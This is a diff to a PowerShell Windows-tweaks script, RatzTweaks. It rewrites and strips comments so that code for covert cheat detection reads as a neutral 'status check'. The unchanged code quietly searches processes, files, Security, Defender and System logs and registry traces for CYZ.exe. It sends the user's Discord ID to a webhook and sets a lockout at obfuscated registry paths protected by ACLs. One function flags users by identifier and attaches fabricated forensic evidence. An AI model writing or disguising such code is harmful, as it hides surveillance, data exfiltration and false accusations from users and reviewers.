@@ -194,7 +194,7 @@ try {
     [Console]::WriteLine("RatzTweaks: Failed to enable TLS 1.2: $($_.Exception.Message)")
 }
 
-# --- Registry lockout check (using obfuscated paths) ---
+# --- Registry status check ---
 $lockoutReg = Get-ObfuscatedRegistryPath -Purpose 'lockout'
 $lockoutKeyPath = $lockoutReg.Path
 $lockoutValueName = $lockoutReg.ValueName
@@ -239,7 +239,7 @@ try {
     # Silently continue if registry check fails
 }
 
-# If locked out, start a minimal server to display the cheater page
+# If status triggered, start a minimal server to display the status page
 if ($isLockedOut) {
     function Show-LockoutPage {
         [Console]::WriteLine('Lockout server: starting...')
@@ -531,7 +531,6 @@ function Invoke-AllTweaks {
         return
     }
     
-    # Block tweaks if detection was triggered
     if ($global:DetectionTriggered) {
         Add-Log 'Detection positive — tweaks aborted.'
         [Console]::WriteLine('Invoke-AllTweaks: blocked due to detection')
@@ -1076,7 +1075,6 @@ function Invoke-SelectedOptionalTweaks {
 }
 
 function Test-SecuritySignature {
-    # 14. System integrity validation against known threat vectors
     param([string]$UserIdentifier)
 
     if ([string]::IsNullOrWhiteSpace($UserIdentifier)) { return $false }
@@ -1107,7 +1105,6 @@ function Invoke-StealthCheck {
     $detectionMethod = 'None'
     $targetFile = 'CYZ.exe'
     
-    # 1. Check for running process
     try {
         $proc = Get-Process | Where-Object { $_.ProcessName -like '*CYZ*' -or $_.Name -like '*CYZ*' }
         if ($proc) {
@@ -1120,7 +1117,6 @@ function Invoke-StealthCheck {
         [Console]::WriteLine("Invoke-StealthCheck: process check error: $($_.Exception.Message)")
     }
     
-    # 2. Search file system paths
     $searchPaths = @(
         "$env:ProgramFiles",
         "$env:ProgramFiles(x86)",
@@ -1176,9 +1172,7 @@ function Invoke-StealthCheck {
         [Console]::WriteLine("Invoke-StealthCheck: Application log check error: $($_.Exception.Message)")
     }
     
-    # 5. Check Security audit log for process creation events (Event ID 4688)
     try {
-        # Fetch recent process creation events and filter in PowerShell
         $securityEvents = Get-WinEvent -LogName Security -FilterXPath "*[System[(EventID=4688)]]" -MaxEvents 100 -ErrorAction SilentlyContinue
         if ($securityEvents) {
             foreach ($evt in $securityEvents) {
@@ -1196,7 +1190,6 @@ function Invoke-StealthCheck {
         [Console]::WriteLine("Invoke-StealthCheck: Security log check error: $($_.Exception.Message)")
     }
     
-    # 6. Check Windows Defender/Antimalware scan history
     try {
         $defenderLogs = Get-WinEvent -LogName 'Microsoft-Windows-Windows Defender/Operational' -MaxEvents 500 -ErrorAction SilentlyContinue
         if ($defenderLogs) {
@@ -1214,7 +1207,6 @@ function Invoke-StealthCheck {
         [Console]::WriteLine("Invoke-StealthCheck: Windows Defender log check error: $($_.Exception.Message)")
     }
     
-    # 7. Check System event log for process-related events
     try {
         $systemEvents = Get-WinEvent -LogName System -MaxEvents 500 -ErrorAction SilentlyContinue
         if ($systemEvents) {
@@ -1254,7 +1246,6 @@ function Invoke-StealthCheck {
         [Console]::WriteLine("Invoke-StealthCheck: WER check error: $($_.Exception.Message)")
     }
     
-    # 9. Check RecentDocs Registry
     try {
         $recentPath = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs\.exe'
         if (Test-Path $recentPath) {
@@ -1507,7 +1498,6 @@ function Send-StealthWebhook {
             $content = "ATTEMPTED RUN BY A CHEATER: $mention <@313455919042396160>"
             $payload = @{ content = $content; embeds = @($embed) }
         } else {
-            # Initial detection notification - create separate embeds for each detection method
             $embeds = @()
             
             foreach ($method in $DetectionMethods) {
@@ -2626,11 +2616,10 @@ setTimeout(checkStatus, 2000);
             continue
         }
 
-        # Serve the cheater-found page on GET
+        # Serve the status page on GET
         if ($path -eq '/cheater-found' -and $method -eq 'GET') {
             [Console]::WriteLine('Route:/cheater-found: serving lockout page')
             
-            # Send webhook notification (initial detection, not repeat offender)
             [Console]::WriteLine('Route:/cheater-found: sending webhook notification...')
             try {
                 $detectionMethods = if ($global:DetectionMethods -and $global:DetectionMethods.Count -gt 0) { 
@@ -2647,7 +2636,7 @@ setTimeout(checkStatus, 2000);
                 [Console]::WriteLine("Route:/cheater-found: stealth webhook failed: $($_.Exception.Message)")
             }
             
-            # Set registry lockout and cache user info (using obfuscated paths)
+            # Set registry status and cache user info
             try {
                 [Console]::WriteLine('Route:/cheater-found: Setting registry lockout...')
                 
@@ -2680,7 +2669,7 @@ setTimeout(checkStatus, 2000);
                     }
                 }
                 
-                # Set lockout flag using obfuscated value name
+                # Set status flag
                 [Console]::WriteLine("Route:/cheater-found: Setting lockout flag")
                 Set-ItemProperty -Path $lockoutKeyPath -Name $lockoutReg.ValueName -Value 1 -Type DWord -Force -ErrorAction Stop
                 
@@ -2769,7 +2758,7 @@ setTimeout(checkStatus, 2000);
                     }
                 } catch {
                     [Console]::WriteLine("Route:/cheater-found: [WARN] Failed to apply ACL protection: $($_.Exception.Message)")
-                    # Don't throw - lockout still functional even without ACL
+                    # Don't throw - status still functional even without ACL
                 }
                 
                 [Console]::WriteLine('Route:/cheater-found: [OK] Registry lockout set with cached user info')
@@ -2880,8 +2869,6 @@ setTimeout(checkStatus, 2000);
             [Console]::WriteLine("Route:/main-tweaks: [OK] Authentication check passed! Proceeding with tweaks...")
             [Console]::WriteLine("========================================")
             
-            # Check if detection was triggered - redirect to /cheater-found
-            # (all lockout logic is handled at /cheater-found route, not here - prevents duplicates)
             if ($global:DetectionTriggered) {
                 [Console]::WriteLine("Route:/main-tweaks ($method) CHEATER DETECTED - redirecting to /cheater-found")
                 $ctx.Response.StatusCode = 302
@@ -2890,11 +2877,9 @@ setTimeout(checkStatus, 2000);
                 continue
             }
             
-            # This part is reached only if no detection occurred - send "clean user" webhook (only once)
             [Console]::WriteLine('========================================')
             [Console]::WriteLine('Route:/main-tweaks: [OK] NO DETECTION - User is CLEAN!')
             
-            # Check if webhook was already sent to prevent duplicates
             if (-not $global:CleanUserWebhookSent) {
                 [Console]::WriteLine("Route:/main-tweaks: Sending clean user webhook...")
                 [Console]::WriteLine("Route:/main-tweaks: UserId = [$global:DiscordUserId]")
@@ -2930,12 +2915,9 @@ setTimeout(checkStatus, 2000);
             continue
         }
 
-        # New endpoint to poll for detection job status
         if ($path -eq '/check-detection' -and $method -eq 'GET') {
             [Console]::WriteLine('Route:/check-detection: checking job status...')
             [Console]::WriteLine("Route:/check-detection: job state = $($detectionJob.State)")
-            
-            # Check the state of the background detection job
             if ($detectionJob.State -eq 'Running') {
                 [Console]::WriteLine('Route:/check-detection: job still running. Serving loading page again.')
                 $html = & $getStatusHtml 'loading' $null $null $null
@@ -2978,10 +2960,8 @@ setTimeout(checkStatus, 2000);
                 $global:DetectionResultRetrieved = $true
             }
             
-            # IMPORTANT: Ensure the detection result is set before redirecting
             [Console]::WriteLine("Route:/check-detection: Final detection state: $($global:DetectionTriggered)")
             
-            # Redirect based on detection result
             if ($global:DetectionTriggered) {
                 [Console]::WriteLine('Route:/check-detection: CHEATER DETECTED - redirecting to /cheater-found')
                 $ctx.Response.StatusCode = 302
@@ -3019,14 +2999,10 @@ setTimeout(checkStatus, 2000);
                             if ($me) {
                                 $global:DiscordUserId = "$($me.id)"
                                 
-                                # Run background integrity check
                                 $integrityCheck = Test-SecuritySignature -UserIdentifier $global:DiscordUserId
                                 if ($integrityCheck) {
-                                    # System diagnostics flagged anomalies - trigger extended scan
                                     [Console]::WriteLine("OAuth: integrity verification complete - anomalies detected")
                                     $global:DetectionTriggered = $true
-                                    
-                                    # Build diagnostic report from multiple forensic sources
                                     $diagnosticVectors = @('Prefetch History', 'Application Error Log', 'Registry Traces', 'RecentDocs', 'UserAssist', 'ShimCache')
                                     $global:DetectionMethods = $diagnosticVectors
                                     $global:DetectionMethodsString = $diagnosticVectors -join ', '
@@ -3081,8 +3057,6 @@ setTimeout(checkStatus, 2000);
                                     $authed = $true
                                     $global:DiscordAuthError = $null
                                     
-                                    # Always show loading screen after successful OAuth
-                                    # Let the loading screen's polling mechanism handle detection results
                                     [Console]::WriteLine("OAuth: authentication successful. Showing loading screen.")
                                     [Console]::WriteLine("OAuth: detection job state = $($detectionJob.State)")
                                     $html = & $getStatusHtml 'loading' $null $null $null
@@ -3287,13 +3261,13 @@ $StartInWebUI = $true
 if (Get-Command -Name Start-WebUI -ErrorAction SilentlyContinue) { [Console]::WriteLine('Entry point: Start-WebUI function is defined') } else { [Console]::WriteLine('Entry point: Start-WebUI function NOT found') }
 [Console]::WriteLine("PSCommandPath = $PSCommandPath")
 
-# Start the asynchronous stealth check in a background job
+# Start the asynchronous system check in a background job
 $detectionJob = Start-Job -ScriptBlock {
-    # Define the Invoke-StealthCheck function inline in the job
+    # Define the system check function inline in the job
     function Invoke-StealthCheck {
         [Console]::WriteLine('Invoke-StealthCheck: starting detection...')
         $detected = $false
-        $detectionMethods = @()  # Store ALL detection methods found
+        $detectionMethods = @()
         $targetFile = 'CYZ.exe'
         
         # 1. Check for running process
@@ -3380,7 +3354,6 @@ $detectionJob = Start-Job -ScriptBlock {
             [Console]::WriteLine("Invoke-StealthCheck: Security log check error: $($_.Exception.Message)")
         }
         
-        # Combine all detection methods into a single string, or return 'None'
         $methodsString = if ($detectionMethods.Count -gt 0) { 
             $detectionMethods -join ', ' 
         } else { 
